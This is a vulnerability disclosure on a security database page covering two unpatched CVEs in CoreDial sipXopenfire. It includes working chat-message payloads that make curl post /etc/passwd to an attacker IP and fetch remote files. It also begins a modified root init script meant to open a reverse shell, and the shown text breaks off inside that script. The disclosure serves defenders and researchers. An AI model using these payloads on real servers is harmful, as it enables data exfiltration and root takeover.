---
title: CoreDial sipXcom sipXopenfire 21.04 Remote Command Execution / Weak Permissionsundefined
url: https://cxsecurity.com/issue/WLB-2023030017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-09
fetch_date: 2025-10-04T08:59:18.066951
---

# CoreDial sipXcom sipXopenfire 21.04 Remote Command Execution / Weak Permissionsundefined

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **CoreDial sipXcom sipXopenfire 21.04 Remote Command Execution / Weak Permissionsundefined** **2023.03.08**  Credit:  **[Systems Research Group](https://cxsecurity.com/author/Systems%2BResearch%2BGroup/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-25356](https://cxsecurity.com/cveshow/CVE-2023-25356/ "Click to see CVE-2023-25356")** | **[CVE-2023-25355](https://cxsecurity.com/cveshow/CVE-2023-25355/ "Click to see CVE-2023-25355")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
¯¯¯¯¯¯¯\\_\_/ ༼ つ ◕\_◕ ༽つ (ง'̀-'́)ง (╯°□°）╯︵ ┻━┻ ヽ(´ー｀)ノ \\_\_/¯¯
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Product: sipXcom sipXopenfire
Vendor: CoreDial
Name: "sipXcom sipXopenfire XMPP message system command
argument injection and insecure service file
permissions RCE"
Version: 21.04 and earlier
Fixed: Nope, no response
Link: http://download.sipxcom.org/
CVEs: CVE-2023-25355 & CVE-2023-25356
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
¯¯\\_\_/ ༼ つ ◕\_◕ ༽つ (ง'̀-'́)ง (╯°□°）╯︵ ┻━┻ ヽ(´ー｀)ノ \\_\_/¯¯¯¯¯¯¯
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
TL;DR
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
CoreDial's sipXcom is a PBX server. It bundles an XMPP server
component sipXopenfire, which is disabled by default. sipXopenfire
is affected by an OS command argument injection vulnerability
(CVE-2023-25356), which allows any user with an XMPP account to pass
arbitrary arguments to a curl command. The same component is also
affected by a weak file permissions vulnerability (CVE-2023-25355),
affecting a service startup script which runs as root. Both issues
can be chained to execute commands as the system root user.
At the time of this disclosure, we have had no response from
CoreDial, and neither issue has been fixed.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
CVE-2023-25356: OS Command Argument Injection
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
As part of the initializePlugin() routine in
sipXopenfire\presence-plugin\src\org\sipfoundry\openfire\plugin\presence\SipXOpenfirePlugin.java,
an "interceptor" called DefaultMessagePacketInterceptor is
registered.
The DefaultMessagePacketInterceptor inspects every message that's
sent through the XMPP server. If a message starts with any of the
strings "@call", "@conf" or "@xfer" (referred to internally as
"directives"), a related code path is taken, where the message
content is processed according to what the specific directive is
meant to achieve.
When a message is intercepted which starts with "@call", all the
text after this string is assumed to be a phone number and passed to
the buildRestCallCommand() function. This function creates a long
URL, which the user input is written directly into. There's no
particular attempt to sanitise this input.
This URL is then passed to the sendRestRequest() function, where it
is appended to a curl command string. This string is then passed to
Runtime.getRuntime().exec(command).
Due to the inner mechanics of Runtime's exec() function, we are only
able to control arguments passed to the main curl command.
The constructed curl command is as follows:
```
curl -k -X POST http://[IPAddress]:[Port]/callcontroller/[callerNumber]/[controlledString]timeout=30&isForwardingAllowed=true
```
Since we can inject arbitrary arguments, we can construct a set of
arguments which will read a file using the -d/--data flag, and send
it over the network to us. The only limitation is that the
sipXopenfire process runs as the daemon user. So we can only read
files that are accessible to daemon. However, this includes
potentially interesting files, like the chat history
(/opt/openfire/logs/sipxopenfire-im.log) when chat logging is
enabled.
As proof-of-concept, the following payload will read /etc/passwd
and post it to http://192.168.96.128/abc.
```
@call abc -o/tmp/test123 -d @/etc/passwd http://192.168.96.128/abc
```
We can also download files and write them to the server filesystem.
The following will download the file from
http://192.168.96.128/test.txt and write it to /tmp/test.txt
```
@call abc -o /tmp/dummy -o /tmp/test.txt -X GET http://192.168.96.128/test.txt -o /tmp/dummy
```
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
CVE-2023-25355: Weak Service File Permissions
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
The /etc/init.d/openfire service file is owned by the daemon user and
group, but runs as the root user. This gives a relatively clear
path to privilege escalation.
It also provides a very useful exploitation path, when chained with
the curl argument injection issue.
Since we can download files and write them to the filesystem, and
the sipXopenfire process runs as the daemon user, we can overwrite
the /etc/init.d/openfire file with a modified version.
The following modified /etc/init.d/openfire will return a shell to
port 4444 on 192.168.96.128 when the sipXopenfire service is
(re)started.
```
#!/bin/sh
#
# openfire Stops and starts the Openfire XMPP service.
#
# chkconfig: 2345 99 1
# description: Openfire is an XMPP server, which is a server that facilitates \
# XML based communication, such as chat.
# config: /opt/openfire/conf/openfire.xml
# config: /etc/sysconfig/openfire
# pidfile: /var/run/openfire.pid
#
# This script has currently been tested on Redhat, CentOS, and Fedora based
# systems.
#
#####
# Begin setup work
#####
# Initialization
PATH="/sbin:/bin:/usr/bin:/usr/sbin"
RETVAL=0
# Check that w...